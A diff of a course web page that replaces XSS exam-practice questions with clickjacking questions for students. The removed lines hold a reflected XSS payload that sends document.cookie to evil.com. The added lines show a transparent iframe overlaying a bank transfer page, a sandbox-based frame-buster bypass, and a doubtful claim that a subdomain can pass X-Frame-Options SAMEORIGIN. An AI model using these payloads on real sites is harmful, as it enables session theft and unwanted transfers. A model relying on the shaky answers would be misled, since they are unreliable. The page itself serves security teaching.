@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>XSS — Exam Practice Questions · CSC351</title>
+  <title>Clickjacking — Exam Practice Questions · CSC351</title>
   <link rel="stylesheet" href="shared/style.css">
   <script src="shared/menu.js" defer></script>
   <style>
@@ -178,6 +178,7 @@
       border-radius: var(--radius-sm);
       word-break: break-all;
       line-height: 1.6;
+      white-space: pre-wrap;
     }
 
     .question-card {
@@ -274,6 +275,16 @@
       display: block;
       margin-top: 6px;
     }
+    .answer-code {
+      display: block;
+      font-family: 'Geist Mono', monospace;
+      font-size: 13px;
+      background: var(--code-bg);
+      color: var(--code-text);
+      padding: 8px 12px;
+      border-radius: var(--radius-sm);
+      margin: 8px 0;
+    }
 
     .set-divider {
       height: 1px;
@@ -318,17 +329,19 @@
         </div>
       </div>
       
+      <div style="height: 1px; background: var(--border); margin: 8px 0;"></div>
+      
       <a class="drawer-menu-item" href="exam-questions.html">
         <span style="font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px;">Part 2 · Exam Prep</span>
         Possible exam questions
       </a>
-      <a class="drawer-menu-item" href="exam-xss.html" style="color: var(--accent); padding-left: 20px;">
+      <a class="drawer-menu-item" href="exam-xss.html" style="padding-left: 20px;">
         ↳ XSS — Practice Questions
       </a>
       <a class="drawer-menu-item" href="exam-sqli.html" style="padding-left: 20px;">
         ↳ SQLi — Practice Questions
       </a>
-      <a class="drawer-menu-item" href="exam-clickjacking.html" style="padding-left: 20px;">
+      <a class="drawer-menu-item" href="exam-clickjacking.html" style="color: var(--accent); padding-left: 20px;">
         ↳ Clickjacking — Practice Questions
       </a>
     </nav>
@@ -341,7 +354,7 @@
       <div class="nav-menu-left" style="margin-left: 48px;">
         <a href="index.html">Topics</a>
         <a href="exam-questions.html">Exam Prep Hub</a>
-        <a href="xss.html">XSS Notes</a>
+        <a href="clickjacking.html">Clickjacking Notes</a>
       </div>
       <a class="nav-brand" href="index.html">Ant</a>
       <div class="nav-menu-right">
@@ -356,8 +369,8 @@
 
   <!-- Hero -->
   <div class="exam-hero">
-    <div class="exam-label">Lecture 11 · Part 2 · Exam Prep</div>
-    <h1 class="exam-title">XSS — Exam Practice Questions</h1>
+    <div class="exam-label">Lecture 13 · Part 2 · Exam Prep</div>
+    <h1 class="exam-title">Clickjacking — Exam Practice Questions</h1>
     <p class="exam-subtitle">Scenario-based questions with model answers. Click any question to reveal the answer.</p>
   </div>
 
@@ -368,50 +381,70 @@
       <h2>Quick Notes</h2>
       <ul class="notes-list">
         <li>
-          <strong>Two types:</strong>
+          <strong>Golden rule — Ajan said this word for word:</strong>
           <ul class="sub-list">
-            <li>Stored = payload saved to database → fires for every visitor automatically</li>
-            <li>Reflected = payload in URL → server echoes it back → victim must click the crafted link</li>
+            <li><em>"The top layer is always clickable"</em> — the user always clicks the topmost iframe regardless of what they physically see on the screen</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Why browser runs it:</strong>
+          <strong>Two overlapping iframes:</strong>
           <ul class="sub-list">
-            <li>Browser trust is origin-based not author-based → code from trusted domain runs with full trust</li>
+            <li><strong>Bottom:</strong> real target page, visible (decoy target background)</li>
+            <li><strong>Top:</strong> transparent (<code>opacity: 0</code>), completely invisible but intercepts and receives all clicks</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Three damages:</strong>
+          <strong>Coordinate system:</strong>
           <ul class="sub-list">
-            <li>Web defacing → JS can change any DOM element</li>
-            <li>Spoofing requests → JS can call fetch() on behalf of user</li>
-            <li>Stealing info → JS can read cookies, page data, localStorage</li>
+            <li>Origin = top-left corner = <code>(0,0)</code></li>
+            <li><code>top</code> = pixels down, <code>left</code> = pixels right, <code>width</code> + <code>height</code> = iframe dimensions</li>
+            <li>Attacker dynamically adjusts top/left margins until the invisible target button sits exactly over the real visible decoy button</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Three defenses (in order):</strong>
+          <strong>Two stacking rules:</strong>
           <ul class="sub-list">
-            <li>Input validation → before saving to database</li>
-            <li>Output encoding → before displaying on screen (&lt; becomes &amp;lt;)</li>
-            <li>CSP header → tells browser to block inline scripts entirely</li>
+            <li><code>z-index</code> → larger integer values sit on top</li>
+            <li>No <code>z-index</code> → the element declared last in the HTML markup sits on top</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Key flags:</strong>
+          <strong>Attack variants:</strong>
           <ul class="sub-list">
-            <li>HttpOnly on cookie → JS cannot read that cookie even from same origin</li>
-            <li>Defense in Depth → applying all three layers together</li>
+            <li><strong>Likejacking</strong> → invisible Facebook/decal Like button over decoy prize links</li>
+            <li><strong>Fake login</strong> → transparent input form fields capture target credentials</li>
+            <li><strong>Small iframe overlay</strong> → tiny iframe covering one specific button only, leaving the rest of the page working normally so the victim suspects nothing</li>
+            <li><strong>Sequence of clicks</strong> → maps multiple consecutive clicks across steps — hardest variant to execute</li>
+          </ul>
+        </li>
+        <div class="notes-divider"></div>
+        <li>
+          <strong>Three defense generations:</strong>
+          <ul class="sub-list">
+            <li><strong>Gen 1 — Frame buster/killer:</strong> JS checks if <code>window.top === window.self</code> and redirects parent if false. <strong>Dead.</strong> Killed by: attacker setting <code>sandbox="allow-forms"</code> on the parent iframe, which disables Javascript execution inside, so the buster logic never runs.</li>
+            <li><strong>Gen 2 — X-Frame-Options (DENY / SAMEORIGIN):</strong> <strong>Deprecated.</strong> Ajan said this explicitly in class — still works on legacy browsers only.</li>
+            <li><strong>Gen 3 — Content-Security-Policy: frame-ancestors:</strong> <code>'none'</code> or <code>'self'</code> or specific URLs. <strong>Current standard.</strong> Configured at Apache/Nginx web server header levels, applying to all pages automatically.</li>
+          </ul>
+        </li>
+        <div class="notes-divider"></div>
+        <li>
+          <strong>SOP inside iframes:</strong>
+          <ul class="sub-list">
+            <li>Same origin → parent context can read/write child iframe DOM tree</li>
+            <li>Different origin → Same-Origin Policy blocks DOM tree reads and writes</li>
+            <li>This is why the attacker makes the top target iframe fully transparent — they cannot read the victim's cross-origin page data anyway, so they only intercept physical inputs.</li>
           </ul>
         </li>
       </ul>
       <div class="exam-trap">
-        <strong>The exam trap:</strong><br>
-        XSS = attacker's code runs in browser<br>
-        CSRF = victim's session used to send forged request
+        <strong>The exam traps:</strong><br>
+        Saying <strong>X-Frame-Options</strong> is the current standard → <strong>deduction</strong>.<br>
+        Saying a <strong>frame buster</strong> still works against attackers → <strong>deduction</strong>.<br>
+        Saying <strong>CSRF tokens</strong> protect against clickjacking → <strong>wrong</strong> (the victim is interacting with their own real, authenticated session, so the tokens are completely valid).
       </div>
     </div>
 
@@ -419,12 +452,22 @@
     <div class="question-set">
       <div class="set-header">
         <span class="set-badge">Question Set 1</span>
-        <h2 class="set-title">Stored XSS Scenario</h2>
+        <h2 class="set-title">SEED Lab Clickjacking Setup</h2>
       </div>
 
       <div class="scenario-block">
         <div class="scenario-label">Scenario</div>
-        <p class="scenario-text">A researcher enters <code style="font-family:'Geist Mono',monospace; background: var(--code-bg); color: var(--code-text); padding: 2px 6px; border-radius: 3px; font-size: 12px;">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> into a social network profile field. When other users visit her profile, the alert fires in their browser.</p>
+        <p class="scenario-text">Ajan demonstrated this exact attack code in the SEED lab. An attacker hosts this page on <code>attacker32.com</code>. The victim is logged into <code>bank32.com</code>.</p>
+        <code class="scenario-code">&lt;!-- Attacker's page on attacker32.com --&gt;
+&lt;iframe id="top" src="http://attacker32.com/fake_prize.html"
+  style="position:absolute; top:0; left:0;
+         width:500px; height:400px; opacity:1.0;"&gt;
+&lt;/iframe&gt;
+
+&lt;iframe id="bottom" src="http://bank32.com/transfer?to=attacker&amp;amount=5000"
+  style="position:absolute; top:0; left:0;
+         width:500px; height:400px; opacity:0.0;"&gt;
+&lt;/iframe&gt;</code>
       </div>
 
       <!-- Q(a) -->
@@ -432,13 +475,16 @@
         <div class="question-card-header" onclick="toggleCard('q1a')">
           <span class="q-tag">Q(a)</span>
           <span class="q-pts">2 pts</span>
-          <span class="q-text">What type of XSS? Why does the victim's browser execute it?</span>
+          <span class="q-text">Which iframe does the victim see? Which iframe actually receives the click? Explain using Ajan's golden rule.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
-            <div class="answer-text">Stored XSS. Browser trust is origin-based — script came from the trusted domain so it runs automatically.</div>
+            <div class="answer-text">
+              The victim physically sees <code>fake_prize.html</code> because its opacity is set to <code>1.0</code>. The bottom <code>bank32.com</code> transfer page is completely invisible (opacity <code>0.0</code>). However, because there are no <code>z-index</code> declarations, the element declared last in the HTML markup (in this case, <code>#bottom</code>) sits on top. 
+              <span class="answer-line">Thus, the invisible <code>#bottom</code> iframe intercepts and receives the victim's physical click. **Ajan's golden rule:** <em>"The top layer is always clickable"</em>, meaning the browser processes clicks on the topmost layer in the stacking order, regardless of opacity.</span>
+            </div>
           </div>
         </div>
       </div>
@@ -448,13 +494,15 @@
         <div class="question-card-header" onclick="toggleCard('q1b')">
           <span class="q-tag">Q(b)</span>
           <span class="q-pts">2 pts</span>
-          <span class="q-text">HttpOnly is set on the session cookie. Does the script still steal it? What can it still do?</span>
+          <span class="q-text">The victim never visited bank32.com directly. Why does the bank still process the transfer as legitimate?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
-            <div class="answer-text">No — HttpOnly blocks document.cookie from JavaScript. But the script can still spoof requests via fetch() or read personal data displayed on the page.</div>
+            <div class="answer-text">
+              The victim is already logged into <code>bank32.com</code> in their browser. When the browser loads the bank page inside the iframe, it automatically attaches the victim's session cookies to all outgoing requests. The bank server processes the request as a fully valid, authenticated transfer transaction, indistinguishable from an intentional action.
+            </div>
           </div>
         </div>
       </div>
@@ -463,14 +511,18 @@
       <div class="question-card" id="q1c">
         <div class="question-card-header" onclick="toggleCard('q1c')">
           <span class="q-tag">Q(c)</span>
-          <span class="q-pts">2 pts</span>
-          <span class="q-text">Name the three XSS defenses in data flow order and the principle they represent.</span>
+          <span class="q-pts">3 pts</span>
+          <span class="q-text">Name all three generations of Clickjacking defense. State dead/deprecated/current for each. For the dead one, explain exactly how attackers defeated it.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
-            <div class="answer-text">Input validation → output encoding → CSP header. Together they represent Defense in Depth.</div>
+            <div class="answer-text">
+              <strong>Gen 1 — Frame buster script (Dead):</strong> JavaScript blocks checking if the current window is top. Attacker defeats this by configuring the iframe with <code>sandbox="allow-forms"</code>, which disables script execution within the frame so the buster code never runs.
+              <span class="answer-line"><strong>Gen 2 — X-Frame-Options (Deprecated):</strong> Header responses (<code>DENY</code>, <code>SAMEORIGIN</code>). Works on older legacy browsers only, and is deprecated.</span>
+              <span class="answer-line"><strong>Gen 3 — CSP frame-ancestors (Current Standard):</strong> Header responses (<code>frame-ancestors 'none' / 'self'</code>). Configured at the web server level to enforce site-wide security.</span>
+            </div>
           </div>
         </div>
       </div>
@@ -479,16 +531,16 @@
       <div class="question-card" id="q1d">
         <div class="question-card-header" onclick="toggleCard('q1d')">
           <span class="q-tag">Q(d)</span>
-          <span class="q-pts">4 pts</span>
-          <span class="q-text">Stored XSS vs Reflected XSS — compare persistence, delivery, and victim scale.</span>
+          <span class="q-pts">3 pts</span>
+          <span class="q-text">Explain why CSRF tokens do NOT protect against Clickjacking, and why SOP does NOT protect against it either.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              <strong>Stored</strong> — payload in database, fires automatically for every visitor, no crafted link needed, unlimited victims.
-              <span class="answer-line"><strong>Reflected</strong> — payload in URL, server echoes it back, victim must click the crafted link, one click one victim.</span>
+              <strong>CSRF Tokens:</strong> The real target page is loaded legitimately inside the iframe, meaning the form contains a completely genuine, valid CSRF token generated for the user's active session. Since no request parameters are forged, CSRF defenses have nothing to detect.
+              <span class="answer-line"><strong>SOP (Same-Origin Policy):</strong> SOP blocks scripts on one origin from reading/writing data inside document nodes of another origin. Clickjacking does not read or write data inside the target frame — it simply lets a physical user click pass through to trigger a button. SOP has nothing to restrict.</span>
             </div>
           </div>
         </div>
@@ -501,13 +553,16 @@
     <div class="question-set">
       <div class="set-header">
         <span class="set-badge">Question Set 2</span>
-        <h2 class="set-title">Reflected XSS Scenario</h2>
+        <h2 class="set-title">Header Bypass &amp; Attack Variants</h2>
       </div>
 
       <div class="scenario-block">
         <div class="scenario-label">Scenario</div>
-        <p class="scenario-text">A search page shows "You searched for: [input]" without encoding. An attacker sends this URL to a victim via QR code:</p>
-        <code class="scenario-code">http://example.com/search?q=&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code>
+        <p class="scenario-text">A security researcher captures this HTTP response header from <code>bank32.com</code>:</p>
+        <code class="scenario-code">HTTP/1.1 200 OK
+Content-Type: text/html
+X-Frame-Options: SAMEORIGIN</code>
+        <p class="scenario-text" style="margin-top: 10px;">An attacker successfully embeds <code>bank32.com</code> inside an iframe on <code>evil.bank32.com</code> and launches a Clickjacking attack.</p>
       </div>
 
       <!-- Q(a) -->
@@ -515,13 +570,15 @@
         <div class="question-card-header" onclick="toggleCard('q2a')">
           <span class="q-tag">Q(a)</span>
           <span class="q-pts">2 pts</span>
-          <span class="q-text">What type of XSS? What makes the page vulnerable?</span>
+          <span class="q-text">How is the attacker able to bypass X-Frame-Options: SAMEORIGIN in this scenario?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
-            <div class="answer-text">Reflected XSS. The page has reflective behavior — it echoes user input back without output encoding.</div>
+            <div class="answer-text">
+              The <code>SAMEORIGIN</code> directive allows a page to be framed by any page sharing the exact same parent origin. Since the attacker hosts their page on <code>evil.bank32.com</code>, depending on how subdomains are evaluated by older browser implementations, it may be treated as sharing the same top-level origin, allowing the subdomain to successfully frame the site.
+            </div>
           </div>
         </div>
       </div>
@@ -531,13 +588,17 @@
         <div class="question-card-header" onclick="toggleCard('q2b')">
           <span class="q-tag">Q(b)</span>
           <span class="q-pts">2 pts</span>
-          <span class="q-text">Why does the browser execute the attacker's script?</span>
+          <span class="q-text">What should the developer have used instead? Write the exact header and explain one advantage it has over X-Frame-Options.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
-            <div class="answer-text">The script arrives in the response from example.com — the browser trusts the origin not the author, so it executes it.</div>
+            <div class="answer-text">
+              Recommended Header:
+              <code class="answer-code">Content-Security-Policy: frame-ancestors 'self'</code>
+              Advantage: <code>frame-ancestors</code> allows the developer to supply a whitelist of multiple safe URLs that can frame the page, whereas <code>X-Frame-Options</code> can only accept one single origin. Furthermore, CSP represents the current web security standard, while <code>X-Frame-Options</code> is deprecated.
+            </div>
           </div>
         </div>
       </div>
@@ -546,16 +607,15 @@
       <div class="question-card" id="q2c">
         <div class="question-card-header" onclick="toggleCard('q2c')">
           <span class="q-tag">Q(c)</span>
-          <span class="q-pts">2 pts</span>
-          <span class="q-text">One sentence each — what is the difference between XSS and CSRF?</span>
+          <span class="q-pts">3 pts</span>
+          <span class="q-text">The attacker's page uses a small iframe overlay variant instead of a full-page iframe. Explain how this variant works and why it is harder for the victim to detect.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              <strong>XSS</strong> — attacker's own code runs in the victim's browser via the trusted site.
-              <span class="answer-line"><strong>CSRF</strong> — no attacker code runs; the victim's browser is tricked into sending a forged request using their own valid session.</span>
+              Rather than framing the entire bank page over the attacker's decoy, the attacker targets a single critical action and overlays a tiny, transparent iframe (sized identically to one button) exactly over a visible decoy button. The rest of the page remains the attacker's normal, legitimate-looking decoy site. If the victim clicks anywhere else on the page, the decoy reacts correctly. The victim does not suspect any security issue because most of the UI responds exactly as expected.
             </div>
           </div>
         </div>
@@ -565,19 +625,16 @@
       <div class="question-card" id="q2d">
         <div class="question-card-header" onclick="toggleCard('q2d')">
           <span class="q-tag">Q(d)</span>
-          <span class="q-pts">4 pts</span>
-          <span class="q-text">Developer says "input validation is enough." Is he right? Why?</span>
+          <span class="q-pts">3 pts</span>
+          <span class="q-text">Ajan demonstrated SOP behavior inside iframes using three iframes — A and B from attacker32.com, C from bank32.com. Explain which iframe the parent can and cannot read, and why this matters for Clickjacking.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              No. Three layers needed:
-              <span class="answer-line"><strong>Input validation</strong> — stops payloads entering the database but doesn't protect against reflected XSS or encoding bypasses.</span>
-              <span class="answer-line"><strong>Output encoding</strong> — converts &lt; to &amp;lt; before rendering, most critical layer.</span>
-              <span class="answer-line"><strong>CSP header</strong> — blocks inline scripts at browser level even if both above fail.</span>
-              <span class="answer-line">This is Defense in Depth — one layer bypassed means total failure without the others.</span>
+              The parent page can read and write inside iframes A and B because they share the same origin (<code>attacker32.com</code>) and SOP allows DOM access. The parent cannot access the DOM of iframe C because it belongs to a different origin (<code>bank32.com</code>) and SOP blocks cross-origin access.
+              <span class="answer-line">This matters because Clickjacking is explicitly designed to bypass SOP limitations. Since the attacker's script cannot extract the bank token, transfer form fields, or user account balances from iframe C, their only option is to lure the authenticated user into physically clicking the invisible transfer button itself.</span>
             </div>
           </div>
         </div>
